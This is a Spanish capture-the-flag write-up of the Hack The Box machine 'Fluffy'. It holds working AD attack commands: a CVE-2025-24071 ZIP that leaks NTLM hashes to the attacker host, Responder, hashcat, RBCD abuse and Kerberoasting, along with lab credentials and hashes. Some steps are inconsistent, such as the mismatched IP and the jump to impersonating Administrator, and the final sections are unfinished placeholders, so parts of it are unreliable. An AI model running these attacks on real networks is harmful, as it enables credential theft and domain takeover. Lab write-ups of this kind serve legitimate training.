
# Fluffy

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Fluffy`
* **IP:** `10.10.11.69`
* **Sistema operativo:** `Windows - AD`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `25/05/2025`

***

## <mark style="color:purple;">Configuración del host</mark>

La plataforma nos proporciona las credenciales iniciales para esta máquina:

```
j.fleischman / J0elTHEM4n1990!
```

#### /etc/passwd

Añadimos la IP `10.10.11.70` a nuestro `/etc/hosts`:

```bash
sudo echo "10.10.11.69 fluffy.htb" | sudo tee -a /etc/hosts
```

***

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -T5 10.10.11.69
```

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-26 03:51:42Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Encontramos multitud de puertos abiertos, lo normal en máquinas Windows. Además nos encontramos con que la máquina objetivo es un Domain Controller, por la presencia de los puertos 3268 o 389, reservados para DCs.

Destacan los puertos:

* `593 (RPC)` - Puede contener recursos compartidos o enumerar usuarios
* `445 (SMB)` - Recursos compartidos y enumeración
* `5985 (WinRM)` - Acceso con EvilWinRM con contraseña
* `88 (Kerberos)` - Posible Kerberoasting o AS-REP Roasting

***

## <mark style="color:purple;">Enumeración inicial</mark>

Con `enum4linux-ng` confirmamos que la máquina es el `DC01` y poca información más relevante:

```bash
enum4linux-ng fluffy.htb

 ===================================
|    Listener Scan on fluffy.htb    |
 ===================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =========================================================
|    Domain Information via SMB session for fluffy.htb    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: FLUFFY
DNS domain: fluffy.htb
FQDN: DC01.fluffy.htb
Derived membership: domain member
Derived domain: FLUFFY

 =======================================
|    RPC Session Check on fluffy.htb    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'fyfaygil', password ''
[H] Rerunning enumeration with user 'fyfaygil' might give more results
```

***

## <mark style="color:purple;">Enumeración de RPC</mark>

```bash
rpcclient -U 'j.fleischman%J0elTHEM4n1990!' 10.10.11.69

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ca_svc] rid:[0x44f]
user:[ldap_svc] rid:[0x450]
user:[p.agila] rid:[0x641]
user:[winrm_svc] rid:[0x643]
user:[j.coffey] rid:[0x645]
user:[j.fleischman] rid:[0x646]
```

Añadimos los usuarios encontramos a un archivo `valid-users.txt`. Probar a volcar tickets Kerberos mediante ASREP-Roasting falla:

```bash
impacket-GetNPUsers fluffy.htb/ -usersfile valid-users.txt -dc-ip 10.10.11.69

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ca_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User p.agila doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.coffey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.fleischman doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## <mark style="color:purple;">Enumeración de SMB</mark>

```bash
smbmap -u j.fleischman -p 'J0elTHEM4n1990!' -d fluffy.htb -H 10.10.11.69

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.69:445	Name: fluffy.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ, WRITE	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections     
```

Encontramos un Share IT interesante con permisos de lectura y escritura, vamos a echarle un ojo.

```bash
smbclient -U j.fleischman \\\\10.10.11.69\\IT

Password for [WORKGROUP\j.fleischman]:
lsTry "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Mon May 26 07:55:52 2025
  ..                                  D        0  Mon May 26 07:55:52 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
  files                               A      793  Mon May 26 07:47:34 2025
  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
  Upgrade.library-ms                  A      364  Mon May 26 07:55:39 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025

		5842943 blocks of size 4096. 1840876 blocks available
		
smb: \> get Upgrade_Notice.pdf 
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (131,1 KiloBytes/sec) (average 131,1 KiloBytes/sec)
smb: \> get KeePass-2.58.zip 
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip (694,1 KiloBytes/sec) (average 571,3 KiloBytes/sec)
smb: \> get Everything-1.4.1.1026.x64.zip 
getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (566,4 KiloBytes/sec) (average 569,6 KiloBytes/sec)
```

Encontramos algunos archivos interesantes como un zip de Keepass que puede contener credenciales, un PDF de aviso de upgrade y lo que parece un archivo de backup Everything-1.4.1. El archivo `Upgrade_Notice.pdf` contiene un informe de vulnerabilidades del sistema que nos indica múltiples CVEs asociados, 2 de ellos Critical:

<figure><img src="/files/Vtrg23Rx694c7pfR455L" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Búsqueda de exploits</mark>

Exploramos los CVEs encontramos el siguiente exploit:

{% embed url="<https://github.com/ThemeHackers/CVE-2025-24071>" %}

El `CVE-2025-24071` permite a un un atacante no autenticado explotar esta vulnerabilidad construyendo archivos RAR/ZIP que contienen una ruta SMB maliciosa. Al descomprimirlos, esto desencadena una solicitud de autenticación SMB, lo que podría exponer el hash NTLM del usuario.

```bash
python3 exploit.py
            
✗ Error: No arguments provided
usage: exploit.py [-h] [-f FILE_NAME] [-i IP_ADDRESS] [-afv]

Create an exploit ZIP file or show affected versions

options:
  -h, --help                   show this help message and exit
  -f, --file-name FILE_NAME    Name of the library file (without extension)
  -i, --ip-address IP_ADDRESS  IP address (e.g., 192.168.1.111)
  -afv, --affected-versions    Display affected versions
```

Vamos a ejecutarlo de la siguiente manera:

```
python3 exploit.py -i 10.10.15.28 -f revshell

          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ | 
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | 
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | | 
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | 
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_| 
                                                
                                                
                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers                                                                                                                                                           
    
Creating exploit with filename: revshell.library-ms
Target IP: 10.10.15.28

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

Ahora vamos a subir el zip malicioso con smbclient, ya que tenemos permisos de escritura para capturar el hash de algún usuario, pero antes abrimos un responder para capturarlo:

```visual-basic
sudo responder -I tun0
```

```bash
smbclient -U j.fleischman \\\\10.10.11.69\\IT    
Password for [WORKGROUP\j.fleischman]:

Try "help" to get a list of possible commands.

smb: \> put exploit.zip
```

Al ejecutar `put exploit.zip` recibimos el hash del usuario `p.aguila`:

<figure><img src="/files/aoreQBdMHqwV5cmUgyoI" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}

```
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:9961e4e0e525dbf2:657D56740F4E8EB5F6AD3837B10B4CC3:010100000000000080F9A1B4CFCDDB01CAC1ACD919FB1E5700000000020008003200460038004C0001001E00570049004E002D004A00350051005A004C00520049005900520057004B0004003400570049004E002D004A00350051005A004C00520049005900520057004B002E003200460038004C002E004C004F00430041004C00030014003200460038004C002E004C004F00430041004C00050014003200460038004C002E004C004F00430041004C000700080080F9A1B4CFCDDB0106000400020000000800300030000000000000000100000000200000A2D9ACA2499DCBBE4871E284A312B3033AEE8210F78564768645ED7044866ABB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00320038000000000000000000
```

{% endcode %}

***

## <mark style="color:purple;">Cracking de hash</mark>

Guardamos el hash en un archivo de texto y lo crackeamos con hashcat:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">hashcat -m 5600 p.aguila.txt /usr/share/wordlists/rockyou.txt --force 
<strong>
</strong><strong>hashcat (v6.2.6) starting
</strong><strong>
</strong>P.AGILA::FLUFFY:9961e4e0e525dbf2:657d56740f4e8eb5f6ad3837b10b4cc3:010100000000000080f9a1b4cfcddb01cac1acd919fb1e5700000000020008003200460038004c0001001e00570049004e002d004a00350051005a004c00520049005900520057004b0004003400570049004e002d004a00350051005a004c00520049005900520057004b002e003200460038004c002e004c004f00430041004c00030014003200460038004c002e004c004f00430041004c00050014003200460038004c002e004c004f00430041004c000700080080f9a1b4cfcddb0106000400020000000800300030000000000000000100000000200000a2d9aca2499dcbbe4871e284a312b3033aee8210f78564768645ed7044866abb0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00320038000000000000000000:prometheusx-303
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
</code></pre>

Tenemos la contraseña de p.agila: `prometheusx-303`. Probamos a acceder con EvilWinRM o RDP pero no tenemos acceso, por lo que enumeraremos más información con Bloodhound.

***

## <mark style="color:purple;">Enumeración con Bloodhound</mark>

### Editar resolv.conf

<pre class="language-bash"><code class="lang-bash">sudo gedit /etc/resolv.conf
<strong>
</strong><strong>domain fluffy.htb
</strong>nameserver 10.10.11.69
search fluffy.htb
</code></pre>

### Bloodhound Python

La enumeración con el usuario `p.agila` y bloodhound-python falla, así que lo añadiremos al grupo SERVICE ACCOUNTS:

```bash
bloodyAD -d fluffy.htb -u p.agila -p 'prometheusx-303' --host 10.10.11.69 add groupMember 'SERVICE ACCOUNTS' p.agila

[+] p.agila added to SERVICE ACCOUNTS
```

Lo ejecutamos de nuevo y ya nos deja

```bash
bloodhound-python -u p.agila -p 'prometheusx-303' -d fluffy.htb -c all --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 12S
INFO: Compressing output into 20250526193227_bloodhound.zip
```

### Análisis con Bloodhound

`P.AGILA` tiene:

* `GenericAll` sobre el grupo **SERVICE ACCOUNT MANAGERS**
* Que es **miembro** de **SERVICE ACCOUNTS**
* Que tiene `GenericWrite` sobre **WINRM\_SVC**

<figure><img src="/files/xTHSGI4Ht2QdhXcWyPB3" alt=""><figcaption></figcaption></figure>

El grupo de `SERVICE ACCOUNTS` tiene 3 miembros y tiene permisos `GenericWrite` sobre los 3 usuarios:

* `CA_SVA`
* `LDAP_SVC`
* `WINRM_SVC`

El que más nos interesa es WINRM\_SVC ya que:

* Tiene un SPN `WINRM/winrm.fluffy.htb`, lo que sugiere que podemos usarlo con **Kerberos + WinRM**.
* Podemos **abusar de `GenericWrite`** para establecer **delegación controlada (RBCD)**&#x20;
* Es el único usuario en el grupo REMOTE DESKTOP USERS

<figure><img src="/files/CPttdrVqfd138R5hZCBQ" alt=""><figcaption></figcaption></figure>

Este camino nos permite:

1. **Modificar atributos de `WINRM_SVC`**, como `msDS-AllowedToActOnBehalfOfOtherIdentity`.
2. **Cambiar su contraseña**.
3. **Suplantar a `WINRM_SVC`**&#x61; través de delegación forzada.

***

## <mark style="color:purple;">Explotación de AD</mark>

### Añadir a p.agila al grupo SERVICE ACCOUNTS

```bash
bloodyAD -d fluffy.htb -u p.agila -p 'prometheusx-303' --host 10.10.11.69 add groupMember 'SERVICE ACCOUNTS' p.agila

[+] p.agila added to SERVICE ACCOUNTS
```

#### Verificación

<pre class="language-bash"><code class="lang-bash">ldapsearch -x -H ldap://10.10.11.69 -D 'p.agila@fluffy.htb' -w 'prometheusx-303' -b 'CN=SERVICE ACCOUNTS,CN=Users,DC=fluffy,DC=htb' member
<strong>
</strong><strong># extended LDIF
</strong>#
# LDAPv3
# base &#x3C;CN=SERVICE ACCOUNTS,CN=Users,DC=fluffy,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: member 
#

# Service Accounts, Users, fluffy.htb
dn: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
member: CN=winrm service,CN=Users,DC=fluffy,DC=htb
member: CN=Prometheus Agila,CN=Users,DC=fluffy,DC=htb
member: CN=ldap service,CN=Users,DC=fluffy,DC=htb
member: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
</code></pre>

### Obtener el SID de winrm\_svc

```q
rpcclient -U 'fluffy.htb\\p.agila%prometheusx-303' 10.10.11.69

rpcclient $> lookupnames winrm_svc
winrm_svc S-1-5-21-497550768-2797716248-2627064577-1603 (User: 1)
```

### Abusar de GenericWrite

#### Verificar campo AllowedToActOnBehalfOfOtherIdentity vacío

```bash
rbcd.py fluffy.htb/p.agila:'prometheusx-303' -dc-ip 10.10.11.69 -delegate-from p.agila -delegate-to WINRM_SVC

Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
```

`WINRM_SVC` puede **impersonar a `p.agila`**, lo cual es muy útil para escalar, porque si tenemos el ticket de `WINRM_SVC`, podemos pedir un ticket para `p.agila` y luego impersonar a `p.agila`.

#### Escribir el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`

```bash
rbcd.py fluffy.htb/p.agila:'prometheusx-303' -dc-ip 10.10.11.69 -delegate-from WINRM_SVC -delegate-to p.agila -action write

Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] WINRM_SVC can now impersonate users on p.agila via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     winrm_svc    (S-1-5-21-497550768-2797716248-2627064577-1603)
```

#### Obtener SID del dominio

```bash
rpcclient -U 'fluffy.htb\\p.agila%prometheusx-303' 10.10.11.69

rpcclient $> lookupdomain fluffy.htb
SAMR_LOOKUP_DOMAIN: Domain Name: fluffy.htb Domain SID: S-1-5-21-497550768-2797716248-2627064577
```

#### Obtener ticket de servicio

```bash
getST.py -spn WINRM/winrm.fluffy.htb -dc-ip 10.10.11.69 fluffy.htb/p.agila:'prometheusx-303'

Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Getting ST for user
[*] Saving ticket in p.agila@WINRM_winrm.fluffy.htb@FLUFFY.HTB.ccache
```

\
Esto generará un ticket .ccache.

#### Pass-the-ticket con Impacket

```
export KRB5CCNAME=p.agila@WINRM_winrm.fluffy.htb@FLUFFY.HTB.ccache
psexec.py -k -no-pass fluffy.htb/Administrator@10.10.11.69
```

#### &#xD;

#### Si tienes WinRM disponible:

```
evil-winrm -k -i 10.10.11.69 -u Administrator --ccache administrator.ccache
```

### Kerberoasting a cuentas de servicio

Ajustamos nuestra hora para que coincida con la del DC:

```bash
sudo ntpdate 10.10.11.69                                                             

2025-05-26 08:07:48.676711 (+0200) +25200.300262 +/- 0.020193 10.10.11.69 s1 no-leap
CLOCK: time stepped by 25200.300262
```

#### Kerberoasting

```bash
python3 targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303'

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ca_svc)
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$3526f0abef5c91acd274030f39cab65f$cdaed2f6043da13d29f8f0e6f4a5b13cb0c084c88933d75f49ed0f914318193d84fec5a0541a3ae292de80a8a757d1a285ea990de665ef45658e9a66817d88eb3aee64967117486d9be69a1750d60559e8e62a7e3e2ca045fa950473de5f1ef31ce0a5efc904774f7a5a897f3d714c806f32d42f84900f86ac35261812c6c40c29ea317d085ba5493f8905c60bbd4febef0cfd5cbdc630db9ed6008b40e276e9ba06fabeaa656b0dc879990730dca9f69a825a3003e666f455150f730c284557bd9bc9761ead306e1069c95f83b3dbd9192af2bb72ae51d137449388f44359caf03e95ea10d2a0b5d69f6c4e45e346c8ea53eaa7ed6bf86ab2fc97c82614b2eb350a1ac6eed8c6db7a31d5c14614a5176cc27e6941b901715f9258c8a92dd1e703009409b8615b1e595fabf6d00227f7ba59c59b00dfd785f84117c8baee2f1aef5fec963f810d2135bbed00c60d57f619d8d8d1344b4e3417682effaebe727d5b3fec2c0fd70ef657d736f5e4071fd309352aef3bc0ea8dcc935eae0b20c2ae799bba005f2b7b0b62869ec293c429e6c902b711c50975eaaad654140958f9b1eecb5d09c351ea98b1be8d3e495198beba1e242e9cb35f025e73c220f6f466e0a66047a045524e10ac4e6a4d5c55181d3d71e7cc9c4ad505f495b2f4ab96f30be27d1a9ae0aec365d33bdbe03a29514d04720444e7679ac8c588b0d04ccc0ae3479c65e7bdd271d4841e9483fc623d144d29d7b96f5f3116d9302eab549ec202675ff14a76e764fe2b7832ff53d42df93548a176d7a4fe062fffc0b535a11489a43974eaefd36ed42a4569673480c53b1a80b65fc8e49d540222a14f566fb718cbe45a0a81566b6c9c6ae3e632fceb29d9f6699aba8bf27113e904d15fb578f55d8b89521197c942787bd1442e2be4b73f9f95189d32acb4017a8f2a2393703a479a8d30b10a7cfcadbe2bdcf587b6d334a777fe8c27b99b0aa26828538dc6aaa1df4045755c28732de336660e92e1abb369a7dc8773b4d8e05fb5fb9c0af5535d54c2d500db526975f5764831afca95a3a2dd9e9ef13aa6fc471b88fd27433b7a9023d9b2b3e5d480f76542691a88c5e5de5153529a43c5dcc731e2e96a58a1157e75ab3965a8aea161119a08ebd6463e0e9c42f4de37ac15880f29e4c79f5dce378306aba6167286e48b6d27625f1fd94c7c06fe406ef7c9cbdcba394bee362368355429ced8d988fe8c131b04ea217c54bc74d4733d3c3c6a69a43a599cb9a9c17cb40bfa1ddc0e27f79500c5a31cac68736a5940d60860a706cab7e6088f34939a239824d9c8431ab3b817acef26e43386896d7906e97012c124fa48ac18d5b269c32436eada582b6f7b75bad67aba5def88420ec6384e226200dceea0d3e33551b494cdac984af667dea24d40d87239b75f1a7171f68dea37faac50c7833f471c72bbffae6fff63a0ce95ac599f24ba2ec68e60092f1ba4c703eaf79cb33fbfd6fa47da7b5a38cc
[+] Printing hash for (ldap_svc)
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$ae8aede5508b8d5f51ba8e966ba8b8c6$ae01adad7570ad1b02a80d028d78edf56168614b92af0f35fb7459a2ac883dc439511eb2c907af8f3bc08ce20489856fbc7147f9a377f63e9ebed40be5dc57717e87761b4d64bd99aeeb2cfa034ed34f6dea32d2d79802cfee21b792c64ebf174a83dfa8365aac30a8a435c89dc7daabaa25c29382acf69188152d11a35b6e1bd08c69d4580c8d069c5efe2d16ef051a9e3aaa51db4d10abd6fcab5786240e3418feef59ecfd65861d30c7562f37b1a210d12ccdf60bcacdd2ce3e5462ee5674cb72df2be230fe6a5bea175da54b28f66878503c8132367e1e06835175bb3796a926e6a20af1919ac07f90a04b35f56369363d6c7a61b2004f44b837270f0f33659afa24fd986067a855070d36985ef7dc35221c58a880d35304e200651ab80a2564665f81e3ab002ca802be31100170f747269409803c4a8f3e48e5f5b66a6032b87d1875d7d1939f9b9470b74907a93d4a50b59abb9ec234d2c80784b07b343e94b9c8a38963c0a38019f8d0d7288717dbf59df78c0e49e7a113f573ab8b32868631d0680a853503c3eccf0033ef5b982e424b567f1245cde3a4ad9ecbcbfaea29b9ebd519a563db4cbd66ad559f94c9bf4d24ee62e24521053877b801eb04b5b7d3bec6325a7bf65ace0def15a590d8a996e441ae2ac8397373ac1b1f5a1d4dda54016f749ff4e0c85fbd90a109ea91f5ad7cb1abe97e615a49a17676cc878296e7e1aed8aa0ed25de7acdf4d54ae853e9a6b5b88bad37908e0729be1503c85dd31b29ba30faa702eb21895198d4bdf8e150f2e471a444e08fa7667eb45d3f4b38125eda0fab3ccdc954d2fb47c9039624e98be49f48edb6371a4bcd5a86418774d0ce6fb72553857aeb80ae454d530c91b905a17ccaa669bd3f6ef4c2d86e5586e1f20de8b2acec2ccc7e18cd9c9d2d68e5727d5ef3137a89237f60289696f52a8bb4208c7cfb4c213b94e1ee97846b9d195f6bcb4f5f5d4e0dc021db9baf532567ac4b22ffb8c05b35abb18c3b51c0554ea02bb78d59a5764a73382ed78dbbe9b28b9e67f5dc4d700e91783650a5a8d7678186f173102e02e460b57309aa3f8bb9919b2ad4c7c3f8f3ed74a179161ef51f3882267f39730caabf326f9f359104627ddd1dc657badbfe3efb4d4625bb8cc1bc1333a5d0cf1e809eeb14d0e076d837b32c2d2b4a6c0d7569811512645599f3555d9f7258663b0fe0920661eceff5e07034dd0aca367e1bb03ba708e951b431e6bd41bc101a636c9dbf765c4d45a5b7d8eb0dd90defcd891ca02f3bc301d59277c22e6d283b93725b5d3ebf505e2391886ad60c2cd9ead747c16a39e4bcb15a6c2ddb6d60c8250f15cbf6233f51346704945d3aaa9b2259afe1154cc49bb6300fc3615b5e304120de2c4c001bd67c88fc56d6a2e2a4cf89171493da618452ccc071d4a767b2f6d9627868b60b10a26e5926c6b2d1f1d2743bdede71b44019e9f1a7c29ae32332fd7d0e6641975dd831cf745cc92f565
[+] Printing hash for (winrm_svc)
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$5db5dca6dbeb6b16e2a02ad85f8db530$81e1f2d6cc0f897b9eee981624eeb267865ae6ac8f4d679df400f3ab445bbafb97f62802eff5c57a0e2d73c4345dcdf7ed8ea8ebbaab8f88aa4244a3acee4581b218ee756e82685084170b65109ef993a6aa9a72b19c5061cd52d00fedfbc4650151159b06bbc41e35cf8ef380298b10655f04d0c870150796a1792237fd17bcbfec901a23f958ec50985c613ae9dd738c386609b04da2e3f8196583f8a0d115a05b1895e3059ad6f7c3f27d61b221522008309421a0ff51df779d5e7f02815f42fe88293d84acd6a916fc7bdcdbe8d73ecc57ffdd2faa15f67cc08708ee07f3d8d898b23fd4314cc806890061d5def921c58bc2615e102f3d6675c723a8d82cb320ba3816c4c21b39a5b34294720b0b6b568e0d591969fbe1b305f48e77e31c7f5a7711cf38646aae6d850373a3c1d166f22d747e45df28ffd51ba59bd4d779dbb531e58c01e212f389459eb32a20e788725f48e549986d4d3fde5d51b2f10a20bfc06bb206d69ae2fc58af4eb45f7e527bf0d05898db4030858d613822c3f02316cfa2a770fcd647b206a7a18ae6f140924130ec02b97235016e1e95168892b406a33c61ff4a903581771150a5dafb64d52bd71cb08c5cf083567736e2fe5d30dccaf71e170f4f1eddef8ae58516a9f4f95f01fb175e8922509d97145420987215528283e4fc5545dad9e2e0ef29a0f2828eaa533b6da6b0def43b441d9af542410699862021a3105a1cf9f6f33751cd60c047b2f2fc8422c9da340d56468fb527fb83b766c61c56a32a07f7a435ce6a109904d7087b497088a4e5fe76c2c26247b9101a3b09f3e0d77a1c993f13af6c88e5c4fc9ee2da979c5c9f5e6753282ea5cbf034285b708dec3e860216cc756833ace88f5e56e70113f320d57e7bd78267051720c3d8225058c8c6230398f857015a3af3adbbaec07e5313aaf9a3968b9e007287353f20b3aaa017aaf021e04934a04f16930396bea9fa1fc0b4282f877fef16a1b3c651d19e6d3250021d3a9787251490961041a419b273602bfbb65d5708ffce2e07ac9db75e4876a159a6027a8f6887b26cc1a83ecb11d11f43726a26aac34c458536df638baf3a63d22db35fcf3d464e299b58e818273b6f8516f39adff9f0297fb9446df69989d3f8da4ab31c31d0fbfe105265d6ecd76c5c5c7f1449cb794f82791bc94799d0260bdfb718482b9be55ec792f88e6d5420ec503b2cbfd5ef61432c96cd452607b9b80f45c01709fadc47441c21143cbd84ffbf950a6e6da3422d95a32ca28e6f98d9c18e481874f5c49bf295b0526fd2546054d0ba5f5797516e6ec99958fcbf36566e2a69311095f43ec406f06f2e7e65963446e621c431ba15a776e86cbbe07ad099ab164cfecd4343df830c047b2dc200680fd54cde28e2ad305a802bcf4f71010a1975fc8e09c77e875be8b2dd15d6718532d872f17c9410b0c46b58079025447cdf81d31fed1ce8b418aca37dcef1654836f21ade20d4506ac5b7
```

Tenemos los TGS de las 3 cuentas de servicio! Probando a crackearlos no conseguimos extraer las contraseñas en plano.

***

## <mark style="color:purple;">User Flag</mark>

Ubicación y obtención de la flag del usuario:

```bash
type C:\Users\[usuario]\Desktop\user.txt
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración básica

```
whoami /priv && systeminfo && net user [usuario]
```

### Herramientas automatizadas

```
WinPEAS, Seatbelt
```

#### Técnicas comunes

* **Token impersonation**
* **Abuso de servicios Windows**
* **Credenciales en claro**

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
type C:\Users\Administrator\Desktop\root.txt
```
